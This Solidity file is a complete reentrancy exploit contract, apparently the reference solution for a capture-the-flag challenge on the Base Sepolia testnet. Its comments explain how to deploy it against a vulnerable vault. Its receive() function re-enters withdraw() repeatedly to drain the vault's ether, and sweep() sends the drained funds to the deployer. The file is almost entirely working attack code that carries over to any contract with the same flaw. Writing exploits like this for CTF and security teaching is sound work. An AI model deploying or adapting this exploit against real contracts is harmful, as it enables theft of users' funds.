// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title  Attacker — reference reentrancy exploit for the jw3b.dev CTF (Base Sepolia).
/// @notice Deploy pointing at the ReentrantVault, then call `attack{value: stake}()`.
///         `attack` deposits your stake and calls `withdraw()`; the vault sends ETH
///         back to this contract BEFORE zeroing our balance, so `receive()` re-enters
///         `withdraw()` and keeps draining until the vault is dry. `sweep()` returns
///         the loot to you. ⚠️ Testnet demonstration only.
contract Attacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public unit;

    constructor(IVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH to stake");
        unit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // Re-enter while the vault can still pay out our (not-yet-zeroed) balance.
        if (address(vault).balance >= unit) {
            vault.withdraw();
        }
    }

    /// @notice Recover all drained ETH to the deployer.
    function sweep() external {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
